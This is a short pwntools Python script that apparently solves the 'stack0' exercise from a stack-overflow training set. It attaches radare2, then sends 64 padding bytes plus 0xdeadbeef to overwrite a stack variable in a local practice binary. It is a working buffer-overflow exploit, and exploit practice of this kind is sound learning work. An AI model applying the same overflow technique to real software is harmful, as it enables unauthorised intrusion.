#!/usr/bin/env python

from pwn import *
import os
import sys

_DEBUG = True

e = ELF('../bin/stack0')
io = process('../bin/stack0')

context.log_level = 'debug'

pack = make_packer(64, endian='little', sign='unsigned')
unpack = make_unpacker(64, endian='little', sign='unsigned')

def radare2():
    c = "aaaa; db main; "
    #c += "db 0x08048417; "
    c += "db; "

    pid = util.proc.pidof(io)[0]
    os.system('screen r2 -d %d -c "%s"' % (pid, c))
    util.proc.wait_for_debugger(pid)

def exploit():
    try:
        io.sendline('A' * 64 + pack(0xdeadbeef))
        io.interactive()
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    if _DEBUG:
        radare2()
    exploit()
